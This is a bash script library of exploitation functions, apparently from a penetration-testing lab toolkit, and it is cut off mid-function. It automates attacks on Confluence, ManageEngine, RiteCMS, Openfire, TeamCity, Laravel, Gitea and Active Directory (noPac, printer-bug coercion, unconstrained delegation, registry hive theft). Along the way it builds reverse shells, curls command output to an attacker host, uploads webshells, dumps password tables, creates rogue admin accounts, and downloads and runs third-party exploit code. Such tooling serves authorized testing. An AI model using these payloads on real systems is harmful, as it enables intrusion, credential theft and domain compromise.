#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/project.sh"
source "$SCRIPTDIR/general.sh"

perform_cve_2022_26134() {

    local confluence_port=$1
    local confluence_ip=$2
    if [ -z "$counter" ]; then
        counter=0
    fi
    counter=$((counter + 1))
    if [ -z "$confluence_port" ]; then
        confluence_port=8090
    fi
    if [ -z "$confluence_ip" ]; then
        confluence_ip="$ip"
    fi
    if [ -z "$cmd" ]; then
        cmd=$(get_bash_reverse_shell basic)    
    fi  
    if [[ ! -z "$output_cmd" ]] && [[ "$output_cmd" == "yes" ]] && [[ ! -z "$http_port" ]] && [[ ! -z "$http_ip" ]]; then
        if [ -f "log/output$counter" ]; then
            rm -f log/output$counter
        fi
        cmd=$cmd' &> /tmp/output'$counter'; curl -T /tmp/output'$counter' http://'$http_ip:$http_port'/log/output'$counter
    fi
    echo "$cmd" | tee -a "$trail_log"
    local ognl="\${new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"new java.lang.ProcessBuilder().command('bash','-c','$cmd').start()\")}"
    echo "OGNL: $ognl" | tee -a $trail_log
    ognl=$(urlencode_noslash "$ognl")
    echo "OGNL payload: $ognl" | tee -a $trail_log
    curl -v http://$confluence_ip:$confluence_port/$ognl/ 2>&1 | tee -a $trail_log
}

perform_ms_rprn() {

    #local coerce_poc='https://raw.githubusercontent.com/p0dalirius/windows-coerced-authentication-methods/refs/heads/master/methods/MS-PAR%20-%20Print%20System%20Asynchronous%20Remote%20Protocol/00.%20Remote%20call%20to%20RpcAsyncOpenPrinter%20(opnum%200)/coerce_poc.py'
    local coerce_poc='https://raw.githubusercontent.com/p0dalirius/windows-coerced-authentication-methods/refs/heads/master/methods/MS-RPRN%20-%20Print%20System%20Remote%20Protocol/65.%20Remote%20call%20to%20RpcRemoteFindFirstPrinterChangeNotificationEx%20(opnum%2065)/coerce_poc.py'

    if [[ ! -f "coerce_poc.py" ]]; then
        echo "Downloading MS-RPRN Coerce PoC..."
        wget $coerce_poc -O coerce_poc.py    
    fi
    if [[ ! -f "coerce_poc.py" ]]; then
        echo "Failed to download coerce_poc.py. Please check your internet connection."
        return 1
    fi
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running this function."
        return 1
    fi
    if [[ -z "$responder_ip" ]] || [[ -z "$dc_ip" ]]; then
        echo "Responder IP and DC IP must be set before running this function."
        return 1
    fi
    python3 coerce_poc.py -d "$domain" -u "$username" -p "$password" "$responder_ip" "$dc_ip"
}

perform_user_unconstrained_delegation() {
    
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$domain" ]]; then
        echo "username, password and domain must be set before running this function."
        return 1
    fi
    if [[ -z "$kud_username" ]] || [[ -z "$kud_password" ]]; then
        echo "kud_username and kud_password must be set before running this function."
        return 1
    fi
    if [[ -z "$dc_ip" ]] || [[ -z "$dc_hostname" ]]; then
        echo "dc_ip and dc_hostname must be set before running this function."
        return 1
    fi
    echo "Adding the DC hostname and domain to the hosts file..."
    add_host "$dc_hostname" "$dc_ip"
    add_host "$domain" "$dc_ip"
    if [[  ! -f "windows_hashgenerator.py" ]]; then
        echo "Copying windows_hashgenerator.py..."
        cp "$SCRIPTDIR/../python/windows_hashgenerator.py" .
    fi
    if [[ ! -d "krbrelayx" ]]; then
        echo "Cloning krbrelayx repository..."
        git clone https://github.com/dirkjanm/krbrelayx.git
    fi
    if [[ -z "$attacker_ip" ]]; then
        attacker_ip=$(get_host_ip)
    fi
    pushd krbrelayx || exit 1
    if pgrep -f "krbrelayx.py"; then
        echo "krbrelayx is already running, please stop it first."
    else
        ./krbrelayx.py -s "${domain}$kud_username" -p $kud_password -dc-ip $dc_ip 
        return 0
    fi
    ccache_file="$dc_hostname"'$@'$domain'_krbtgt@'$domain'.ccache'
    echo "Checking for ccache file: $ccache_file"
    if [[ -f $ccache_file ]]; then
        echo "Exporting ccache file..."
        export KRB5CCNAME=$(pwd)/$ccache_file
        impacket-secretsdump -just-dc-user jeffadmin -no-pass -k $dc_hostname
    else
        python3 addspn.py -u "$domain\\$username" -p $password  --target-type samname -t "$kud_username" -s 'cifs/attacker.'$domain $dc_ip
        python3 dnstool.py -u "$domain\\$username" -p $password -r "attacker.$domain" -a add -d "$attacker_ip" "$dc_ip"
        python3 printerbug.py "$domain/$username:$password@$dc_hostname" "attacker.$domain"
    fi
    popd || exit 1
}

# For manageengine, see the security updates to ensure the build is vulnerable to the exploit
# https://www.manageengine.com/products/applications_manager/security-updates/security-updates.html
# CVE-2019-11448
perform_cve_2019_11448() {

    if [[ -z "$target_ip" ]]; then
        echo "target_ip is not set, going to use the default $ip"
        target_ip=$ip
    fi
    if [[ ! -z "$appmanager_folder" ]]; then
        echo "Using custom appmanager folder: $appmanager_folder"
    else
        appmanager_folder='C:\Program Files\ManageEngine\AppManager14'
    fi
    if [[ ! -z "$cookie_jar" ]]; then
        echo "Using cookie jar: $cookie_jar"
    else
        cookie_jar="manageengine_cookie.txt"
        echo "Cookie jar is not set. Using default $cookie_jar"        
    fi
    if [[ ! -z "$sql_cmd" ]]; then
        echo "Using custom SQL command: $sql_cmd"
    else
        sql_cmd="copy (select username,password from AM_UserPasswordTable) to $$$appmanager_folder\working\users.txt$$"
    fi
    local cmd="sid=1;$sql_cmd;-- "
    cmd=$(echo "$cmd" | sed 's/ /+/g')
    curl -c $cookie_jar "http://$target_ip:44444/jsp/Popup_SLA.jsp" -d "$cmd"
}

#remote reg save
#when you have backup operators of the domain
#https://github.com/snovvcrash/RemoteRegSave
perform_remote_regsave() {
    git clone https://github.com/snovvcrash/RemoteRegSave.git
    if [[ ! -f "RemoteRegSave/RegSave/bin/Release/RegSave.exe" ]]; then
        echo "RegSave.exe not found, please build it first"
        exit 1
    fi
    generate_windows_download "RemoteRegSave/RegSave/bin/Release/RegSave.exe" "RegSave.exe"
    if [ ! -f "SeBackupPrivilegeUtils.dll" ]; then
        wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true -O SeBackupPrivilegeUtils.dll
    fi
    if [ ! -f "SeBackupPrivilegeCmdLets.dll" ]; then
        wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true -O SeBackupPrivilegeCmdLets.dll
    fi
    generate_windows_download "SeBackupPrivilegeUtils.dll" "SeBackupPrivilegeUtils.dll"
    generate_windows_download "SeBackupPrivilegeCmdLets.dll" "SeBackupPrivilegeCmdLets.dll"
    upload_file "sam.hive"
    upload_file "system.hive"
    upload_file "security.hive"
}

perform_local_regsave() {
    echo 'reg save hklm\sam C:\windows\temp\sam.hive'
    echo 'reg save hklm\system C:\windows\temp\system.hive'
    if [ -z "$target_sam" ]; then
        target_sam=sam.hive
    fi
    if [ -z "$target_system" ]; then
        target_system=system.hive
    fi
    upload_file "$target_sam"
    upload_file "$target_system"
}

#ritecms
perform_cve_2021_46367() {
    if [[ -z $target_url ]]; then
        target_url=http://$ip/cms
        echo "target_url is not set, going to use the default $target_url"
    fi
    if [[ -z $username ]]; then
        username=admin
        echo "username is not set, going to use the default $username"
    fi
    if [[ -z $password ]]; then
        password=admin
        echo "password is not set, going to use the default $password"
    fi
    if [[ -z $cookie_jar ]]; then
        cookie_jar=ritecms_cookie.txt
        echo "cookie_jar is not set, going to use the default $cookie_jar"
    fi
    local file="webshell.php"
    if [[ -f "$file" ]]; then
        rm $file
    fi
    cp $SCRIPTDIR/../php/webshell.php $file
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    local proxy_option= #"--proxy localhost:8080"
    cmd=$(echo "$cmd" | sed -E 's/"/\\"/g')
    cmd=$(escape_sed "$cmd")
    sed -E -i "s/\{cmd\}/$cmd/g" "$file"
    curl -b $cookie_jar -c $cookie_jar -d "username=$username" -d "userpw=$password" "$target_url/admin.php" $proxy_option
    curl -b $cookie_jar -c $cookie_jar -d "mode=filemanager" -d "delete=../webshell.php" -d "dir=files" -d "confirmed=OK - Delete file" \
        "$target_url/admin.php" $proxy_option
    curl -b $cookie_jar -c $cookie_jar -F "mode=filemanager" -F "file=@$file;filename=$file" -F "directory=files" -F "file_name=../$file" -F "upload_mode=1" \
        -F "upload_file_submit=OK - Upload file" \
        "$target_url/admin.php" $proxy_option

    curl $target_url/webshell.php
}

# aerospike database attack <5.1.0.3
perform_cve_2020_13151() {
    local url="https://github.com/b4ny4n/CVE-2020-13151/archive/refs/heads/master.zip"
    if [[ ! -d "CVE-2020-13151-master" ]]; then
        echo "Downloading CVE-2020-13151 exploit..."
        wget $url -O CVE-2020-13151.zip
        unzip CVE-2020-13151.zip
    fi
    pushd CVE-2020-13151-master || exit 1
    sed -E -i "s/'timeout'/'total_timeout'/g" cve2020-13151.py
    if [[ -z "$target_ip" ]]; then
        target_ip=$ip
        echo "target_ip is not set, going to use the default $target_ip"
    fi
    if [[ -z "$host_ip" ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, going to use the default $host_ip"
    fi
    if [[ -z "$host_port" ]]; then
        host_port=4444
        echo "host_port is not set, going to use the default $host_port"
    fi
    python3 cve2020-13151.py --ahost $target_ip --lhost $host_ip --lport $host_port --cmd "$cmd"
    popd || exit 1
}

#spring4shell

perform_cve_2022_22965() {
    local url="https://github.com/p1ckzi/CVE-2022-22965/archive/refs/heads/main.zip"
    if [[ ! -d "CVE-2022-22965-main" ]]; then
        echo "Downloading CVE-2022-22965 exploit..."
        wget $url -O CVE-2022-22965.zip
        unzip CVE-2022-22965.zip
    fi
    if [[ -z "$target_url" ]]; then
        echo "target_url is not set"
        return 1
    fi
    pushd CVE-2022-22965-main || exit 1
        python3 spring4shell $target_url
    popd || exit 1
}

#nopac
#samaccount spoofing

perform_cve_2021_42278() {
    local url="https://github.com/Ridter/noPac/archive/refs/heads/main.zip"
    local cve_dir="CVE-2021-42278"
    if [[ ! -d $cve_dir ]]; then
        echo "Downloading CVE-2021-42278 exploit..."
        wget $url -O CVE-2021-42278.zip
        unzip CVE-2021-42278.zip
        mv noPac-main $cve_dir
    fi
    if [[ -z $dc_ip ]]; then
        echo "dc_ip is not set"
        return 1
    fi
    if [[ -z $target_username ]]; then
        echo "target_username is not set"
        return 1
    fi
    pushd $cve_dir || exit 1
    python scanner.py "$domain/$username:$password" -dc-ip $dc_ip
    python noPac.py "$domain/$username:$password" -dc-ip $dc_ip --impersonate $target_username -dump
    popd || exit 1

}


perform_apache_nifi_rce() {

    local url="https://raw.githubusercontent.com/imjdl/Apache-NiFi-Api-RCE/refs/heads/master/exp.py"
    local dir=nifi_rce
    if [[ ! -d "$dir" ]]; then
        mkdir "$dir"
    fi
    pushd "$dir" || exit 1    
    if [[ ! -f "exp.py" ]]; then
        echo "Downloading Apache NiFi RCE exploit..."
        wget $url -O exp.py
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        echo "cmd is not set"
        return 1
    fi
    echo "Running Apache NiFi RCE exploit..."
    python3 exp.py "$target_url" "$cmd"
    popd || exit 1
}

perform_limesurvey_exploit () {

    local url="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/archive/refs/heads/main.zip"
    local exploit_dir="Limesurvey-RCE"
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    if [[ ! -d $exploit_dir ]]; then
        echo "Downloading Limesurvey RCE exploit..."
        wget $url -O Limesurvey-RCE.zip
        unzip Limesurvey-RCE.zip
        mv Limesurvey-RCE-main $exploit_dir        
    fi
    pushd $exploit_dir || exit 1
    rm -f Y1LD1R1M.zip
    sed -E -i "s/\\\$ip = '.*/\\\$ip = '$host_ip';/g" php-rev.php
    sed -E -i "s/\\\$port = .*/\\\$port = $host_port;/g" php-rev.php
    zip Y1LD1R1M.zip php-rev.php config.xml
    sed -E -i 's/\/root\/limesurvey\/plugin\///g' exploit.py
    python3 exploit.py $target_url $username $password 80
    popd || exit 1
}

# subrion cms
perform_cve_2018_19422 () {
    local cve_dir="CVE-2018-19422"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    pushd $cve_dir || exit 1
    if [[ ! -f 49876.py ]]; then
        searchsploit -m 49876
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    cmd=$(urlencode "$cmd")
    sed -i -E 's/^code_exec\(\)/#code_exec\(\)/g' 49876.py
    local output=$(python3 49876.py -u "$target_url" -l "$username" -p "$password")
    local webshell_name=$(echo "$output" | grep -oP 'webshell name: \K.*')
    local exploit_url=$(echo $target_url | sed -E 's/panel/uploads/g')
    echo "$exploit_url$webshell_name.phar?cmd=$cmd"
    curl "$exploit_url$webshell_name.phar?cmd=$cmd"
    popd || exit 1
}

# grafana exploit

perform_cve_2021_43798() {
    local cve_dir="CVE-2021-43798"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    pushd $cve_dir || exit 1
    if [[ ! -f 50581.py ]]; then
        searchsploit -m 50581
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    python3 50581.py -H "$target_url" | tee -a "$log_dir/50581.log"
    popd || exit 1


}

#rconfig
perform_cve_2019_19509() {
    local cve_dir="CVE-2019-19509"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 48261.py ]]; then
        searchsploit -m 48261
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default $target_ip"        
    fi
    if [[ -z $target_port ]]; then
        target_port=443
    fi
    sed -i -E 's/allow_redirects=False\)/allow_redirects=False, verify=False)/g' 48261.py
    sed -i -E 's/timeout=10\)/timeout=10, verify=False)/g' 48261.py
    echo "host_ip=$host_ip, host_port=$host_port"
    python3 48261.py https://$target_ip:$target_port $host_ip $host_port | tee -a "$log_dir/48261.log"
    popd || return 1
}

perform_cve_2020_10879() {
    local cve_dir="CVE-2020-10879"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 48241.py ]]; then
        searchsploit -m 48241
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    
    echo python3 48241.py "$target_url" "$username" "$password" "$host_ip" "$host_port" | tee -a "$log_dir/48241.log"
    python3 48241.py "$target_url" "$username" "$password" "$host_ip" "$host_port" | tee -a "$log_dir/48241.log"

    popd || exit 1
}

perform_cve_2020_10220() {
    local cve_dir="CVE-2020-10220"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 48208.py ]]; then
        searchsploit -m 48208
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    sed -E -i 's/encoded_request\)/encoded_request, verify=False)/g' 48208.py
    python3 48208.py "$target_url" | tee -a "$log_dir/48208.log"
    popd || exit 1
}

#confluence

perform_cve_2022_26123() {
    local url="https://raw.githubusercontent.com/jbaines-r7/through_the_wire/refs/heads/main/through_the_wire.py"
    local cve_dir="CVE-2022-26123"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default $target_ip"        
    fi
    if [[ -z $target_port ]]; then
        target_port=8090
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using default $host_ip"
    fi
    if [[ -z $host_port ]]; then
        host_port=443
        echo "host_port is not set, using default $host_port"
    fi
    if [[ -z $target_protocol ]]; then
        target_protocol="http://"
        echo "target_protocol is not set, using default $target_protocol"
    fi
    if [[ -z $exploit_options ]]; then
        exploit_options="--reverse-shell"
    fi
    pushd $cve_dir || exit 1
    if [[ ! -f through_the_wire.py ]]; then
        wget "$url" -O through_the_wire.py
    fi
    python3 through_the_wire.py --rhost "$target_ip" --rport "$target_port" --lhost "$host_ip" --lport "$host_port" --protocol "$target_protocol" $exploit_options
    popd || exit 1
}

create_gitea_account() {
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        username="test"
        echo "username is not set, using default $username"
    fi
    if [[ -z $password ]]; then
        password="password"
        echo "password is not set, using default $password"
    fi
    if [[ -z $email ]]; then
        email="email@example.com"
        echo "email is not set, using default $email"
    fi
    cookie_jar=gitea_cookie.txt
    hidden_inputs=$(get_post_hidden_inputs)
    curl -X POST "$target_url/user/sign_up" \
        -d "username=$username" \
        -d "email=$email" \
        -d "password=$password" \
        -d "$hidden_inputs" \
        -b "$cookie_jar" -c "$cookie_jar"
}

perform_cve_2019_11229() {
    local cve_dir="CVE-2019-11229"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $mirror_host ]]; then
        mirror_host=$(get_host_ip)
        echo "mirror_host is not set, using default $mirror_host"
    fi
    if [[ -z $mirror_port ]]; then
        mirror_port=3000
        echo "mirror_port is not set, using default $mirror_port"
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 49383.py ]]; then
        searchsploit -m 49383
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
        cmd=$(encode_bash_payload "$cmd")
    fi
    cmd=$(escape_sed "$cmd")
    sed -E -i "s/USERNAME = .*/USERNAME = \"$username\"/g" 49383.py
    sed -E -i "s/PASSWORD = .*/PASSWORD = \"$password\"/g" 49383.py
    sed -E -i "s/HOST_ADDR = .*/HOST_ADDR = \"$mirror_host\"/g" 49383.py
    sed -E -i "s/PORT = .*/PORT = $mirror_port/g" 49383.py
    sed -E -i "s/URL = .*/URL = '$(escape_sed "$target_url")'/g" 49383.py
    sed -E -i "s/CMD = .*/CMD = '$cmd'/g" 49383.py
    python3 49383.py | tee -a "$log_dir/49383.log"
    popd || exit 1
}

#gerapy
#cve 2021 32849

perform_cve_2021_43857() {
    local cve_dir="CVE-2021-43857"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default $target_ip"
    fi
    if [[ -z $target_port ]]; then
        target_port=8000
        echo "target_port is not set, using default $target_port"
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
        echo "host_ip is not set, using default $host_ip"
    fi
    if [[ -z $host_port ]]; then
        echo "host_port is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 50640.py ]]; then
        searchsploit -m 50640
    fi
    sed -E -i "s/login = .*/login = \"$username\"/g" 50640.py
    sed -E -i "s/password = .*/password = \"$password\"/g" 50640.py
    python3 50640.py --target "$target_ip" --port "$target_port" --lh "$host_ip" --lp "$host_port" | tee >(remove_color_to_log >> "$log_dir/50640.log")
    popd || exit 1
}

perform_cve_2021_32849() {
    local cve_dir="CVE-2021-32849"
    local url="https://raw.githubusercontent.com/lowkey0808/cve-2021-32849/refs/heads/main/CVE-2021-32849.py"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        echo "username is not set"
        return 1
    fi
    if [[ -z $password ]]; then
        echo "password is not set"
        return 1
    fi
    if [[ -z $cmd ]]; then
        cmd="id"
    fi
    pushd $cve_dir || return 1
    if [[ ! -f cve-2021-32849.py ]]; then
        wget "$url" -O cve-2021-32849.py
    fi
    python3 cve-2021-32849.py -u "$target_url" -U "$username" -P "$password" -r "$host_ip" -p "$host_port" -c "$cmd" | tee >(remove_color_to_log >> "$log_dir/50640.log")
    popd || exit 1
}

perform_cve_2021_3129_joshua() {
    local cve_dir="CVE-2021-3129"
    #local url="https://github.com/khanhnv-2091/laravel-8.4.2-rce/archive/refs/heads/main.zip"
    local url="https://github.com/joshuavanderpoll/CVE-2021-3129/archive/refs/heads/main.zip"
    if [[ ! -d $cve_dir ]]; then
        echo "Downloading CVE-2021-3129 exploit..."
        wget $url -O CVE-2021-3129.zip
        unzip CVE-2021-3129.zip
        mv CVE-2021-3129-main $cve_dir
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    if ! pgrep -f "python3 CVE-2021-3129.py"; then
        python3 CVE-2021-3129.py  --host "$target_url" | tee >(remove_color_to_log >> "$log_dir/50292.log")
    fi
    popd || exit 1

}

perform_cve_2021_3129_khanhnv() {
    local cve_dir="CVE-2021-3129"
    local url="https://github.com/khanhnv-2091/laravel-8.4.2-rce/archive/refs/heads/main.zip"
    if [[ ! -d $cve_dir ]]; then
        echo "Downloading CVE-2021-3129 exploit..."
        wget $url -O CVE-2021-3129.zip
        unzip CVE-2021-3129.zip
        mv laravel-8.4.2-rce-main CVE-2021-3129
    fi
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $target_log ]]; then
        target_log="/var/www/html/storage/logs/laravel.log"
        echo "target_log is not set, using default $target_log"
    fi
    if [[ -z $cmd ]]; then
        cmd='uname =a'
    fi
    pushd $cve_dir || return 1
    local phpggc_url="https://github.com/ambionics/phpggc/archive/refs/heads/master.zip"
    if [[ ! -d phpggc ]]; then
        wget $phpggc_url -O phpggc.zip
        unzip phpggc.zip
        mv phpggc-master phpggc
    fi
    if ! pgrep -f "python3 exploit.py"; then
        echo "$target_url $target_log"
        sed -E -i "s/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/read=consumed/g" exploit.py
        python3 exploit.py  "$target_url" "$target_log" "$cmd"| tee >(remove_color_to_log >> "$log_dir/50292.log")
    fi
    popd || exit 1

}

perform_cve_2021_3129(){
    local url="https://raw.githubusercontent.com/ambionics/laravel-exploits/refs/heads/main/laravel-ignition-rce.py"
    local cve_dir="CVE-2021-3129"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi
    pushd $cve_dir || return 1
    local phpggc_url="https://github.com/ambionics/phpggc/archive/refs/heads/master.zip"
    if [[ ! -d phpggc ]]; then
        wget $phpggc_url -O phpggc.zip
        unzip phpggc.zip
        mv phpggc-master phpggc
    fi
    if [[ ! -f laravel-ignition-rce.py ]]; then
        wget "$url" -O laravel-ignition-rce.py
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
        cmd=$(encode_bash_payload "$cmd")
    fi
    php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o exploit.phar --fast-destruct monolog/rce1 system "$cmd"
    sed -E -i "s/execute-solution\//execute-solution/g" laravel-ignition-rce.py
    python3 laravel-ignition-rce.py $target_url exploit.phar
    popd || exit 1
}

# openfire path traversal
perform_cve_2023_32315() {
    local cve_dir="CVE-2023-32315"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $cookie_jar ]]; then
        cookie_jar="openfire_cookie.txt"
        echo "cookie_jar is not set, using default $cookie_jar"
    fi

    if [[ -z $username ]]; then
        username="testadmin"
        echo "username is not set, using default $username"
    fi
    if [[ -z $password ]]; then
        password="admin"
        echo "password is not set, using default $password"
    fi
    local escaped_path="../.."
    escaped_path=$(echo -n "$escaped_path" | sed 's/\./%u002e/g')
    local target_path="$escaped_path/log.jsp"
    #curl "$target_url/setup/setup-s/$target_path"

    pushd $cve_dir || return 1   
    local url="https://github.com/igniterealtime/openfire-exampleplugin/archive/b21751cebb4db0e439e944e0fafe90bb9b1888a9.zip"
    if [[ ! -d openfire-exampleplugin ]]; then
        echo "Downloading openfire-exampleplugin repository..."
        wget $url -O openfire-exampleplugin.zip        
        unzip openfire-exampleplugin.zip
        mv openfire-exampleplugin-b21751cebb4db0e439e944e0fafe90bb9b1888a9 openfire-exampleplugin
        rn openfire-exampleplugin.zip
    fi
    target_path="$escaped_path/plugin-admin.jsp"
    curl -I -b $cookie_jar -c $cookie_jar -v "$target_url/setup/setup-s/$target_path"
    csrf_token=$(cat $cookie_jar | grep -oP 'csrf[[:space:]]+\K[^ ]+' )
    echo "csrf_token: $csrf_token"
    #attempt to create admin user
    target_path="$escaped_path/user-create.jsp"
    curl -s -b $cookie_jar -c $cookie_jar \
        --proxy localhost:8080 \
        "$target_url/setup/setup-s/$target_path?csrf=$csrf_token&username=$username&name=$name&email=$email&password=$password&passwordConfirm=$password&isadmin=on&create=Create+User" > /dev/null 

    create_jsp_webshell
    pushd openfire-exampleplugin || return 1
    cp ../webshell.jsp src/main/web/exampleplugin-page.jsp    
    mvn -B package
    cp target/exampleplugin.jar ../exampleplugin.jar
    popd || return 1
    target_path="$escaped_path/plugin-admin.jsp"
    echo "uploading exampleplugin.jar"
    echo "$target_url/setup/setup-s/$target_path?uploadplugin&csrf=$csrf_token"
    csrf_token=$(cat $cookie_jar | grep -oP 'csrf[[:space:]]+\K[^ ]+' )
    echo "csrf_token: $csrf_token"
    curl -b $cookie_jar -c $cookie_jar "$target_url/setup/setup-s/$target_path?uploadplugin&csrf=$csrf_token" \
        -F "uploadfile=@exampleplugin.jar;type=application/java-archive" \
        --proxy localhost:8080

    #-F "file=@exampleplugin.jar"
    popd || return 1    
    curl -I "$target_url/setup/setup-s/$escaped_path/plugins/exampleplugin/exampleplugin-page.jsp?cmd=id" 
    curl -I "$target_url/setup/setup-s/$escaped_path/plugins/exampleplugin/exampleplugin-page.jsp" 

}

#teamcity before 2023.05.4

perform_cve_2023_42793() {
    local cve_dir="CVE-2023-42793"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 51884.py ]]; then
        searchsploit -m 51884
    fi
    python3 51884.py -u "$target_url"  | tee >(remove_color_to_log >> "$log_dir/51884.log")
    username=$(cat "$log_dir/51884.log" | grep -oP 'Username: \K.*')
    password=$(cat "$log_dir/51884.log" | grep -oP 'Password: \K.*')
    echo "Extracted credentials - Username: $username, Password: $password"
    popd || exit 1


}

perform_cve_2024_27198() {
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $username ]]; then
        username="haxor"
        echo "username is not set, using default $username"
    fi
    if [[ -z $password ]]; then
        password="haxor"
        echo "password is not set, using default $password"
    fi
    if [[ -z $email ]]; then
        email="haxor@example.com"
        echo "email is not set, using default $email"
    fi
    #create adnmin user
    curl -ik "$target_url/hax?jsp=/app/rest/users;.jsp" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"$username\", \"password\": \"$password\", \"email\": \"$email\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}" 

}

perform_cve_2021_40964() {
    local cve_dir="CVE-2021-40964"
    #local url = "https://github.com/hadrian3689/h3k_tinyfilemanager_rce/archive/refs/heads/main.zip"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    if [[ ! -f 50828.sh ]]; then
        searchsploit -m 50828
    fi
    bash 50828.sh "$target_url" "$username" "$password"  | tee >(remove_color_to_log >> "$log_dir/50828.log")
    popd || exit 1
}

perform_cve_2024_42007() {
    local cve_dir="CVE-2024-42007"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    if [[ -z $target_file ]]; then
        target_file="/etc/passwd"
        echo "target_file is not set, using default $target_file"
    fi
    pushd $cve_dir || return 1
    curl "$target_url/?SPX_KEY=$spx_key&SPX_UI_URI=/../../../../../../../$target_file"     
    popd || exit 1
}

perform_cve_2024_24497() {
    local cve_dir="CVE-2024-24497"
    if [[ ! -d $cve_dir ]]; then
        mkdir $cve_dir
    fi  
    if [[ -z $target_url ]]; then
        echo "target_url is not set"
        return 1
    fi
    pushd $cve_dir || return 1
    sql_cmd="admin'; -- //"
    sql_cmd=$(urlencode "$sql_cmd")
    username="admin"
    password="$sql_cmd"
    if [[ -z $cookie_jar ]]; then
        cookie_jar="cookie.txt"
        echo "cookie_jar is not set, using default $cookie_jar"
    fi
    curl -v -k -b $cookie_jar -c $cookie_jar "$target_url/Admin/login.php" \
        -d "txtusername=$username" \
        -d "txtpassword=$password" \
        -d "btnlogin=" --proxy localhost:8080
    curl -v -k -b $cookie_jar -c $cookie_jar "$target_url/Admin/index.php" --proxy localhost:8080
